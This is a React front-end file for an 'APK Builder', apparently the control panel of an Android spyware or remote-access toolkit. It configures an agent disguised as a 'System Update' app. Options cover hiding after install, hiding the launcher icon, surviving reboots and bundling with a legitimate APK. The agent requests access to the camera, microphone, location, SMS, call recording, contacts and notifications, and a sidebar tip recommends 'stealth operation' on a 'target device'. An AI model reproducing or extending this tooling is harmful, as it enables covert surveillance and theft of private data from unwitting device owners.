import React, { useState, useCallback, useEffect, useRef } from "react";
import axios from "axios";
import toast from "react-hot-toast";
import {
  FiCode,
  FiDownload,
  FiFile,
  FiArchive,
  FiCheckCircle,
  FiXCircle,
  FiClock,
  FiAlertCircle,
  FiCamera,
  FiMic,
  FiMapPin,
  FiMessageSquare,
  FiPhone,
  FiUsers,
  FiFolder,
  FiBell,
  FiSmartphone,
  FiShield,
  FiEye,
  FiEyeOff,
  FiSettings,
  FiSave,
  FiRefreshCw,
  FiTerminal,
  FiInfo,
} from "react-icons/fi";

const API = import.meta.env.VITE_API_URL || "http://localhost:5000";
const DEFAULT_SERVER_URL =
  typeof window !== "undefined"
    ? window.location.origin
    : "http://localhost:5000";

// Helper to get auth headers
const authHeaders = () => ({
  headers: { Authorization: `Bearer ${localStorage.getItem("token")}` },
});

const permissionOptions = [
  {
    id: "camera",
    icon: FiCamera,
    label: "Camera",
    desc: "Front & back camera access",
    color: "blue",
  },
  {
    id: "microphone",
    icon: FiMic,
    label: "Microphone",
    desc: "Audio recording",
    color: "red",
  },
  {
    id: "location",
    icon: FiMapPin,
    label: "Location",
    desc: "GPS & network location",
    color: "green",
  },
  {
    id: "sms",
    icon: FiMessageSquare,
    label: "SMS",
    desc: "Read & send messages",
    color: "purple",
  },
  {
    id: "calls",
    icon: FiPhone,
    label: "Calls",
    desc: "Call logs & recording",
    color: "orange",
  },
  {
    id: "contacts",
    icon: FiUsers,
    label: "Contacts",
    desc: "Contact list access",
    color: "indigo",
  },
  {
    id: "storage",
    icon: FiFolder,
    label: "Storage",
    desc: "File system access",
    color: "yellow",
  },
  {
    id: "notifications",
    icon: FiBell,
    label: "Notifications",
    desc: "Notification interception",
    color: "pink",
  },
];

const iconOptions = [
  { name: "Calculator", file: "calc_icon.png" },
  { name: "Settings", file: "settings_icon.png" },
  { name: "System Update", file: "update_icon.png" },
  { name: "Game", file: "game_icon.png" },
  { name: "Weather", file: "weather_icon.png" },
  { name: "Battery", file: "battery_icon.png" },
  { name: "Custom", file: "custom" },
];

export default function ApkBuilder() {
  const [step, setStep] = useState(1);
  const [config, setConfig] = useState({
    name: "System Update",
    packageName: "com.android.system.update",
    version: "1.0.0",
    serverUrl: DEFAULT_SERVER_URL,
    wsUrl: DEFAULT_SERVER_URL,
    icon: "update_icon.png",
    iconFile: null,
    hideAfterInstall: true,
    hideLauncher: false,
    persistence: true,
    bindWithApk: null,
    permissions: {
      camera: true,
      microphone: true,
      location: true,
      sms: true,
      calls: true,
      contacts: true,
      storage: true,
      notifications: true,
    },
  });
  const [buildHistory, setBuildHistory] = useState([]);
  const [building, setBuilding] = useState(false);
  const [currentBuild, setCurrentBuild] = useState(null);
  const [buildStatuses, setBuildStatuses] = useState({});
  const pollRef = useRef(null);

  // Fetch previous builds on mount
  useEffect(() => {
    fetchBuildHistory();
    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, []);

  const fetchBuildHistory = async () => {
    try {
      const res = await axios.get(`${API}/api/apk/builds`, authHeaders());
      setBuildHistory(res.data);
      // Check statuses of any in-progress builds
      res.data.forEach((b) => {
        if (!b.status || b.status === "building" || b.status === "configured") {
          pollBuildStatus(b.buildId);
        }
      });
    } catch (err) {
      // Silently fail on history fetch
    }
  };

  const pollBuildStatus = (buildId) => {
    const checkStatus = async () => {
      try {
        const res = await axios.get(
          `${API}/api/apk/status/${buildId}`,
          authHeaders()
        );
        setBuildStatuses((prev) => ({ ...prev, [buildId]: res.data }));
        return res.data;
      } catch {
        return null;
      }
    };

    // Immediate check
    checkStatus();
  };

  const updatePermission = (id) => {
    setConfig((prev) => ({
      ...prev,
      permissions: { ...prev.permissions, [id]: !prev.permissions[id] },
    }));
  };

  const handleBuild = async () => {
    setBuilding(true);
    setCurrentBuild(null);
    try {
      const res = await axios.post(
        `${API}/api/apk/build`,
        config,
        authHeaders()
      );
      const { buildId, message } = res.data;

      toast.success(message || "Build configuration saved!");
      setCurrentBuild({ buildId, ...config });

      // Add to history
      const newBuild = {
        buildId,
        name: config.name,
        version: config.version,
        packageName: config.packageName,
        createdAt: new Date().toISOString(),
        status: "configured",
      };
      setBuildHistory((prev) => [newBuild, ...prev]);

      // Check status
      pollBuildStatus(buildId);

      // Move to step 3 to show download options
      setStep(3);
    } catch (err) {
      toast.error(
        "Build failed: " + (err.response?.data?.error || err.message)
      );
    } finally {
      setBuilding(false);
    }
  };

  const downloadBuildScript = async (buildId) => {
    try {
      const response = await axios.get(`${API}/api/apk/script/${buildId}`, {
        ...authHeaders(),
        responseType: "blob",
      });

      const url = window.URL.createObjectURL(new Blob([response.data]));
      const link = document.createElement("a");
      link.href = url;
      link.setAttribute(
        "download",
        `build_apk_${config.name.replace(/\s+/g, "_") || "app"}.sh`
      );
      document.body.appendChild(link);
      link.click();
      link.remove();
      window.URL.revokeObjectURL(url);

      toast.success("Build script downloaded!");
    } catch (err) {
      toast.error(
        "Download failed: " + (err.response?.data?.error || err.message)
      );
    }
  };

  const handleIconUpload = useCallback((file) => {
    setConfig((prev) => ({ ...prev, iconFile: file, icon: "custom" }));
  }, []);

  return (
    <div className="space-y-8">
      {/* Header */}
      <div>
        <h1 className="text-3xl font-bold">APK Builder</h1>
        <p className="text-dark-400 mt-1">
          Configure and generate build scripts for your assessment agent
        </p>
      </div>

      {/* Info Banner */}
      <div className="p-4 rounded-2xl bg-yellow-500/10 border border-yellow-500/20 flex items-start gap-4">
        <FiAlertCircle className="text-yellow-400 text-xl flex-shrink-0 mt-0.5" />
        <div>
          <p className="font-medium text-yellow-400">How it works</p>
          <p className="text-sm text-yellow-300/70 mt-1">
            The APK build happens on your local machine with Android SDK.
            Configure your app here, then download the build script and run it
            on your machine with Android Studio installed.
          </p>
        </div>
      </div>

      {/* Progress Steps */}
      <div className="flex items-center gap-4 p-1 glass-effect rounded-2xl">
        {["Configuration", "Permissions", "Build & Download"].map(
          (label, i) => (
            <button
              key={i}
              onClick={() => setStep(i + 1)}
              className={`flex-1 py-3 px-4 rounded-xl text-sm font-medium transition-all ${
                step === i + 1
                  ? "bg-gradient-to-r from-primary-500 to-purple-600 text-white shadow-lg"
                  : "text-dark-400 hover:text-white"
              }`}
            >
              {label}
            </button>
          )
        )}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
        {/* Main Config */}
        <div className="lg:col-span-2 space-y-6">
          {step === 1 && (
            <>
              {/* Basic Info */}
              <div className="glass-effect rounded-2xl p-6">
                <h3 className="text-lg font-semibold mb-6 flex items-center gap-2">
                  <FiSettings className="text-primary-400" />
                  Basic Configuration
                </h3>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm text-dark-300 mb-2">
                      App Name
                    </label>
                    <input
                      type="text"
                      value={config.name}
                      onChange={(e) =>
                        setConfig((prev) => ({
                          ...prev,
                          name: e.target.value,
                        }))
                      }
                      className="w-full px-4 py-3 rounded-xl bg-dark-700/50 border border-dark-600/50 text-white placeholder-dark-400 focus:outline-none focus:border-primary-500/50 focus:ring-1 focus:ring-primary-500/30 transition-all"
                      placeholder="System Update"
                    />
                  </div>

                  <div>
                    <label className="block text-sm text-dark-300 mb-2">
                      Package Name
                    </label>
                    <input
                      type="text"
                      value={config.packageName}
                      onChange={(e) =>
                        setConfig((prev) => ({
                          ...prev,
                          packageName: e.target.value,
                        }))
                      }
                      className="w-full px-4 py-3 rounded-xl bg-dark-700/50 border border-dark-600/50 text-white placeholder-dark-400 focus:outline-none focus:border-primary-500/50 focus:ring-1 focus:ring-primary-500/30 transition-all"
                      placeholder="com.android.system.update"
                    />
                  </div>

                  <div>
                    <label className="block text-sm text-dark-300 mb-2">
                      Version
                    </label>
                    <input
                      type="text"
                      value={config.version}
                      onChange={(e) =>
                        setConfig((prev) => ({
                          ...prev,
                          version: e.target.value,
                        }))
                      }
                      className="w-full px-4 py-3 rounded-xl bg-dark-700/50 border border-dark-600/50 text-white placeholder-dark-400 focus:outline-none focus:border-primary-500/50 focus:ring-1 focus:ring-primary-500/30 transition-all"
                      placeholder="1.0.0"
                    />
                  </div>

                  <div>
                    <label className="block text-sm text-dark-300 mb-2">
                      App Icon
                    </label>
                    <select
                      value={config.icon}
                      onChange={(e) =>
                        setConfig((prev) => ({
                          ...prev,
                          icon: e.target.value,
                        }))
                      }
                      className="w-full px-4 py-3 rounded-xl bg-dark-700/50 border border-dark-600/50 text-white focus:outline-none focus:border-primary-500/50 focus:ring-1 focus:ring-primary-500/30 transition-all"
                    >
                      {iconOptions.map((opt) => (
                        <option key={opt.name} value={opt.file}>
                          {opt.name}
                        </option>
                      ))}
                    </select>
                  </div>

                  <div className="md:col-span-2">
                    <label className="block text-sm text-dark-300 mb-2">
                      Server URL{" "}
                      <span className="text-yellow-400">
                        (Use your deployed backend URL for remote access)
                      </span>
                    </label>
                    <input
                      type="text"
                      value={config.serverUrl}
                      onChange={(e) =>
                        setConfig((prev) => ({
                          ...prev,
                          serverUrl: e.target.value,
                          wsUrl: e.target.value,
                        }))
                      }
                      className="w-full px-4 py-3 rounded-xl bg-dark-700/50 border border-dark-600/50 text-white placeholder-dark-400 focus:outline-none focus:border-primary-500/50 focus:ring-1 focus:ring-primary-500/30 transition-all"
                      placeholder="http://localhost:5000"
                    />
                  </div>
                </div>
              </div>

              {/* Behavior Settings */}
              <div className="glass-effect rounded-2xl p-6">
                <h3 className="text-lg font-semibold mb-6 flex items-center gap-2">
                  <FiShield className="text-primary-400" />
                  Behavior Settings
                </h3>

                <div className="space-y-4">
                  <label className="flex items-center justify-between p-4 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all cursor-pointer">
                    <div>
                      <p className="font-medium">Hide After Installation</p>
                      <p className="text-xs text-dark-400 mt-1">
                        App icon disappears from launcher after first run
                      </p>
                    </div>
                    <div
                      className={`w-12 h-6 rounded-full transition-all ${
                        config.hideAfterInstall
                          ? "bg-primary-500"
                          : "bg-dark-600"
                      } relative`}
                    >
                      <div
                        className={`w-5 h-5 rounded-full bg-white absolute top-0.5 transition-all ${
                          config.hideAfterInstall ? "left-6" : "left-0.5"
                        }`}
                      />
                      <input
                        type="checkbox"
                        checked={config.hideAfterInstall}
                        onChange={() =>
                          setConfig((prev) => ({
                            ...prev,
                            hideAfterInstall: !prev.hideAfterInstall,
                          }))
                        }
                        className="hidden"
                      />
                    </div>
                  </label>

                  <label className="flex items-center justify-between p-4 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all cursor-pointer">
                    <div>
                      <p className="font-medium">Hide Launcher Icon</p>
                      <p className="text-xs text-dark-400 mt-1">
                        No launcher icon shown in app drawer
                      </p>
                    </div>
                    <div
                      className={`w-12 h-6 rounded-full transition-all ${
                        config.hideLauncher ? "bg-primary-500" : "bg-dark-600"
                      } relative`}
                    >
                      <div
                        className={`w-5 h-5 rounded-full bg-white absolute top-0.5 transition-all ${
                          config.hideLauncher ? "left-6" : "left-0.5"
                        }`}
                      />
                      <input
                        type="checkbox"
                        checked={config.hideLauncher}
                        onChange={() =>
                          setConfig((prev) => ({
                            ...prev,
                            hideLauncher: !prev.hideLauncher,
                          }))
                        }
                        className="hidden"
                      />
                    </div>
                  </label>

                  <label className="flex items-center justify-between p-4 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all cursor-pointer">
                    <div>
                      <p className="font-medium">Persistence Mode</p>
                      <p className="text-xs text-dark-400 mt-1">
                        Auto-restart after reboot or force close
                      </p>
                    </div>
                    <div
                      className={`w-12 h-6 rounded-full transition-all ${
                        config.persistence ? "bg-primary-500" : "bg-dark-600"
                      } relative`}
                    >
                      <div
                        className={`w-5 h-5 rounded-full bg-white absolute top-0.5 transition-all ${
                          config.persistence ? "left-6" : "left-0.5"
                        }`}
                      />
                      <input
                        type="checkbox"
                        checked={config.persistence}
                        onChange={() =>
                          setConfig((prev) => ({
                            ...prev,
                            persistence: !prev.persistence,
                          }))
                        }
                        className="hidden"
                      />
                    </div>
                  </label>
                </div>

                {/* Bind with APK */}
                <div className="mt-6">
                  <label className="block text-sm text-dark-300 mb-2">
                    Bind with Another APK (Optional)
                  </label>
                  <div className="flex gap-4">
                    <input
                      type="file"
                      accept=".apk"
                      onChange={(e) =>
                        setConfig((prev) => ({
                          ...prev,
                          bindWithApk: e.target.files[0]?.name,
                        }))
                      }
                      className="flex-1 px-4 py-3 rounded-xl bg-dark-700/50 border border-dark-600/50 text-dark-300 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:bg-primary-500/20 file:text-primary-400 file:text-sm hover:file:bg-primary-500/30 transition-all"
                    />
                  </div>
                  <p className="text-xs text-dark-500 mt-2">
                    Select a legitimate APK to bundle the agent with it
                  </p>
                </div>
              </div>
            </>
          )}

          {step === 2 && (
            <div className="glass-effect rounded-2xl p-6">
              <h3 className="text-lg font-semibold mb-6 flex items-center gap-2">
                <FiShield className="text-primary-400" />
                Permission Configuration
              </h3>
              <p className="text-sm text-dark-400 mb-6">
                Select which permissions the agent will request. These map to
                Android runtime permissions.
              </p>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {permissionOptions.map((perm) => {
                  const Icon = perm.icon;
                  const isEnabled = config.permissions[perm.id];

                  return (
                    <button
                      key={perm.id}
                      onClick={() => updatePermission(perm.id)}
                      className={`flex items-center gap-4 p-4 rounded-xl border transition-all text-left ${
                        isEnabled
                          ? "bg-primary-500/10 border-primary-500/30 hover:bg-primary-500/20"
                          : "bg-dark-700/30 border-dark-600/50 hover:bg-dark-700/50"
                      }`}
                    >
                      <div
                        className={`w-12 h-12 rounded-xl flex items-center justify-center ${
                          isEnabled ? "bg-primary-500/20" : "bg-dark-600/50"
                        }`}
                      >
                        <Icon
                          className={`text-xl ${
                            isEnabled ? "text-primary-400" : "text-dark-400"
                          }`}
                        />
                      </div>
                      <div className="flex-1">
                        <div className="flex items-center justify-between">
                          <p className="font-medium">{perm.label}</p>
                          <div
                            className={`w-10 h-5 rounded-full transition-all ${
                              isEnabled ? "bg-primary-500" : "bg-dark-600"
                            } relative`}
                          >
                            <div
                              className={`w-4 h-4 rounded-full bg-white absolute top-0.5 transition-all ${
                                isEnabled ? "left-5" : "left-0.5"
                              }`}
                            />
                          </div>
                        </div>
                        <p className="text-xs text-dark-400 mt-0.5">
                          {perm.desc}
                        </p>
                      </div>
                    </button>
                  );
                })}
              </div>
            </div>
          )}

          {step === 3 && (
            <div className="glass-effect rounded-2xl p-6">
              <h3 className="text-lg font-semibold mb-6 flex items-center gap-2">
                <FiRefreshCw className="text-primary-400" />
                Build & Download
              </h3>

              {/* Build Summary */}
              <div className="space-y-4 mb-8">
                <div className="p-4 rounded-xl bg-dark-700/30">
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <p className="text-xs text-dark-400">App Name</p>
                      <p className="font-medium">{config.name}</p>
                    </div>
                    <div>
                      <p className="text-xs text-dark-400">Package</p>
                      <p className="font-medium">{config.packageName}</p>
                    </div>
                    <div>
                      <p className="text-xs text-dark-400">Version</p>
                      <p className="font-medium">{config.version}</p>
                    </div>
                    <div>
                      <p className="text-xs text-dark-400">Server URL</p>
                      <p className="font-medium text-primary-400">
                        {config.serverUrl}
                      </p>
                    </div>
                    <div>
                      <p className="text-xs text-dark-400">Permissions</p>
                      <p className="font-medium">
                        {
                          Object.values(config.permissions).filter(Boolean)
                            .length
                        }{" "}
                        / 8 enabled
                      </p>
                    </div>
                    <div>
                      <p className="text-xs text-dark-400">Persistence</p>
                      <p className="font-medium">
                        {config.persistence ? "Enabled" : "Disabled"}
                      </p>
                    </div>
                  </div>
                </div>

                {/* Build Steps */}
                <div className="space-y-3">
                  <div className="flex items-start gap-3 p-3 rounded-xl bg-dark-700/30">
                    <div className="w-7 h-7 rounded-full bg-primary-500/20 flex items-center justify-center flex-shrink-0 mt-0.5">
                      <span className="text-primary-400 text-xs font-bold">
                        1
                      </span>
                    </div>
                    <div>
                      <p className="font-medium text-sm">Configure on Server</p>
                      <p className="text-xs text-dark-400">
                        Save your configuration to the server
                      </p>
                    </div>
                    {currentBuild && (
                      <FiCheckCircle className="text-green-400 flex-shrink-0 mt-1" />
                    )}
                  </div>
                  <div className="flex items-start gap-3 p-3 rounded-xl bg-dark-700/30">
                    <div className="w-7 h-7 rounded-full bg-primary-500/20 flex items-center justify-center flex-shrink-0 mt-0.5">
                      <span className="text-primary-400 text-xs font-bold">
                        2
                      </span>
                    </div>
                    <div>
                      <p className="font-medium text-sm">
                        Download Build Script
                      </p>
                      <p className="text-xs text-dark-400">
                        Get the shell script to build the APK locally
                      </p>
                    </div>
                  </div>
                  <div className="flex items-start gap-3 p-3 rounded-xl bg-dark-700/30">
                    <div className="w-7 h-7 rounded-full bg-primary-500/20 flex items-center justify-center flex-shrink-0 mt-0.5">
                      <span className="text-primary-400 text-xs font-bold">
                        3
                      </span>
                    </div>
                    <div>
                      <p className="font-medium text-sm">
                        Run Script on Local Machine
                      </p>
                      <p className="text-xs text-dark-400">
                        Execute on a machine with Android Studio/SDK
                      </p>
                    </div>
                  </div>
                  <div className="flex items-start gap-3 p-3 rounded-xl bg-green-500/10 border border-green-500/20">
                    <div className="w-7 h-7 rounded-full bg-green-500/20 flex items-center justify-center flex-shrink-0 mt-0.5">
                      <span className="text-green-400 text-xs font-bold">
                        4
                      </span>
                    </div>
                    <div>
                      <p className="font-medium text-sm text-green-400">
                        APK Ready
                      </p>
                      <p className="text-xs text-green-300/70">
                        Install on target device via adb or direct download
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              {/* Build Button */}
              {!currentBuild ? (
                <button
                  onClick={handleBuild}
                  disabled={building}
                  className="w-full py-4 rounded-xl bg-gradient-to-r from-primary-500 to-purple-600 text-white font-semibold hover:shadow-lg hover:shadow-primary-500/25 transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-3 text-lg"
                >
                  {building ? (
                    <>
                      <FiRefreshCw className="animate-spin" />
                      Configuring Build...
                    </>
                  ) : (
                    <>
                      <FiCode className="text-xl" />
                      Configure Build
                    </>
                  )}
                </button>
              ) : (
                <div className="space-y-4">
                  {/* Success message */}
                  <div className="p-4 rounded-xl bg-green-500/10 border border-green-500/20">
                    <div className="flex items-center gap-2 mb-2">
                      <FiCheckCircle className="text-green-400" />
                      <span className="font-medium text-green-400">
                        Build Configured Successfully
                      </span>
                    </div>
                    <p className="text-sm text-green-300/70">
                      Build ID: {currentBuild.buildId}
                    </p>
                  </div>

                  {/* Download Script Button */}
                  <button
                    onClick={() => downloadBuildScript(currentBuild.buildId)}
                    className="w-full py-4 rounded-xl bg-gradient-to-r from-green-500 to-emerald-600 text-white font-semibold hover:shadow-lg hover:shadow-green-500/25 transition-all flex items-center justify-center gap-3"
                  >
                    <FiDownload className="text-xl" />
                    Download Build Script (.sh)
                  </button>

                  {/* Instructions */}
                  <div className="p-4 rounded-xl bg-dark-700/30">
                    <p className="text-sm font-medium mb-3 flex items-center gap-2">
                      <FiTerminal className="text-primary-400" />
                      Run on your local machine:
                    </p>
                    <div className="bg-black rounded-lg p-3 font-mono text-xs space-y-2">
                      <p className="text-green-400">
                        # 1. Place script in project root (same folder as
                        android-agent/)
                      </p>
                      <p className="text-dark-200">
                        chmod +x build_apk_
                        {config.name.replace(/\s+/g, "_") || "app"}.sh
                      </p>
                      <p className="text-green-400 mt-2">
                        # 2. Run the build script
                      </p>
                      <p className="text-dark-200">
                        ./build_apk_
                        {config.name.replace(/\s+/g, "_") || "app"}.sh
                      </p>
                      <p className="text-green-400 mt-2">
                        # 3. Install on device (once built)
                      </p>
                      <p className="text-dark-200">
                        adb install
                        android-agent/app/build/outputs/apk/debug/app-debug.apk
                      </p>
                    </div>
                  </div>

                  {/* Requirements */}
                  <div className="p-4 rounded-xl bg-yellow-500/10 border border-yellow-500/20">
                    <p className="text-sm font-medium text-yellow-400 flex items-center gap-2 mb-2">
                      <FiInfo />
                      Requirements for local build:
                    </p>
                    <ul className="text-xs text-yellow-300/70 space-y-1 list-disc list-inside">
                      <li>Android Studio installed with SDK 26+</li>
                      <li>Java 17+ (JDK)</li>
                      <li>ANDROID_HOME environment variable set</li>
                      <li>
                        The android-agent/ folder must be next to the script
                      </li>
                    </ul>
                  </div>
                </div>
              )}
            </div>
          )}
        </div>

        {/* Sidebar - Build History & Tips */}
        <div className="space-y-6">
          <div className="glass-effect rounded-2xl p-6">
            <h3 className="font-semibold mb-4">Build Tips</h3>
            <div className="space-y-3">
              <div className="p-3 rounded-xl bg-blue-500/10 border border-blue-500/20">
                <p className="text-sm text-blue-400 font-medium">Server URL</p>
                <p className="text-xs text-blue-300/70 mt-1">
                  Use your deployed Render URL: https://your-app.onrender.com
                </p>
              </div>
              <div className="p-3 rounded-xl bg-green-500/10 border border-green-500/20">
                <p className="text-sm text-green-400 font-medium">
                  Hidden Mode
                </p>
                <p className="text-xs text-green-300/70 mt-1">
                  Enable both "Hide" options for stealth operation
                </p>
              </div>
              <div className="p-3 rounded-xl bg-purple-500/10 border border-purple-500/20">
                <p className="text-sm text-purple-400 font-medium">
                  Persistence
                </p>
                <p className="text-xs text-purple-300/70 mt-1">
                  Ensures agent survives device reboots
                </p>
              </div>
              <div className="p-3 rounded-xl bg-orange-500/10 border border-orange-500/20">
                <p className="text-sm text-orange-400 font-medium">
                  Build Script
                </p>
                <p className="text-xs text-orange-300/70 mt-1">
                  Download and run on your machine with Android Studio
                </p>
              </div>
            </div>
          </div>

          {buildHistory.length > 0 && (
            <div className="glass-effect rounded-2xl p-6">
              <h3 className="font-semibold mb-4">Build History</h3>
              <div className="space-y-3 max-h-96 overflow-y-auto">
                {buildHistory.map((build, i) => {
                  const status = buildStatuses[build.buildId] || build;
                  const isReady = status.status === "ready";
                  const isFailed = status.status === "failed";
                  const isBuilding =
                    !status.status ||
                    status.status === "building" ||
                    status.status === "configured" ||
                    status.status === "unknown";

                  return (
                    <div
                      key={build.buildId || i}
                      className={`p-3 rounded-xl ${
                        isReady
                          ? "bg-green-500/10 border border-green-500/20"
                          : isFailed
                          ? "bg-red-500/10 border border-red-500/20"
                          : "bg-dark-700/30"
                      }`}
                    >
                      <div className="flex items-center justify-between mb-1">
                        <p className="font-medium text-sm">
                          {build.name || config.name}
                        </p>
                        {isReady && (
                          <FiCheckCircle className="text-green-400 text-sm" />
                        )}
                        {isFailed && (
                          <FiXCircle className="text-red-400 text-sm" />
                        )}
                        {isBuilding && (
                          <FiClock className="text-yellow-400 text-sm" />
                        )}
                      </div>
                      <p className="text-xs text-dark-400">
                        {new Date(build.createdAt).toLocaleString()}
                      </p>
                      <p
                        className={`text-xs mt-1 ${
                          isReady
                            ? "text-green-400"
                            : isFailed
                            ? "text-red-400"
                            : "text-yellow-400"
                        }`}
                      >
                        {isReady
                          ? "Ready"
                          : isFailed
                          ? `Failed: ${status.error || ""}`
                          : "Configured"}
                      </p>

                      <div className="flex gap-2 mt-2">
                        {isBuilding && (
                          <button
                            onClick={() => downloadBuildScript(build.buildId)}
                            className="flex items-center gap-1.5 text-xs px-3 py-1.5 rounded-lg bg-primary-500/20 text-primary-400 hover:bg-primary-500/30 transition-all"
                          >
                            <FiDownload />
                            Get Script
                          </button>
                        )}
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
